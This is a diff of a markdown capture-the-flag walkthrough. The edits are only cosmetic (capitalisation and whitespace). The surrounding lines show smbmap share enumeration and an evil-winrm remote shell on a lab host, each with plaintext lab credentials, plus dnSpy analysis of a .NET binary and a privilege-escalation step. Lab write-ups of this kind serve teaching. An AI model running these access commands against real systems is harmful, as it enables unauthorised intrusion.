@@ -207,7 +207,7 @@ Local Group Memberships
 - Remote Management Use
 ```
 
-This group membership grants this user access to the _Audit Share_:
+This group membership grants this user access to the _Audit share_:
 ```
 smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
 ```
@@ -245,7 +245,6 @@ The executable file _CascAudit.exe_ is a **.NET Binary**:
 file CascAudit.exe
 
 PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
-
 ```
 Such files can be analyzed and debugged with [dnSpy](https://github.com/dnSpy/dnSpy) on Windows.
 The _CascCrypto.dll_ has probably the security functions for this binary.
@@ -285,7 +284,7 @@ evil-winrm.rb -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd
 
 ### Privilege Escalation to Administrator
 
-The user _arksvc_ is in the group _AD Recycle Bin_ which is what is needed to get information about the _TempAdmin_ account:
+The user _ArkSvc_ is in the group _AD Recycle Bin_ which is what is needed to get information about the _TempAdmin_ account:
 ```
 net users /domain ArkSvc
 
